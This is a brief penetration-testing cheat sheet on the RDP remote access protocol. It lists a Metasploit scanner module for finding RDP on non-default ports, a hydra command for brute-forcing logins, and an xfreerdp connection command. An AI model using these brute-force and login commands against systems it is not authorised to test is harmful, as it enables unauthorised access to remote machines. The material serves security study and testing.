Proprietary GUI remote access protocol, and uses 3389 by default. However, sysadmins often change this port to obfuscate this service.

RDP does require a valid account, so bruteforcing is a common technique.

**Exploiting RDP**

Metasploit

auxiliary/scanner/rdp/rdp_scanner ( helps you identify RDP when running on obfuscated port )

hydra to crack

hydra -l user -p password rdp://ip.addr -s port

xfreerdp /u:username /p:password /v:ip.addr
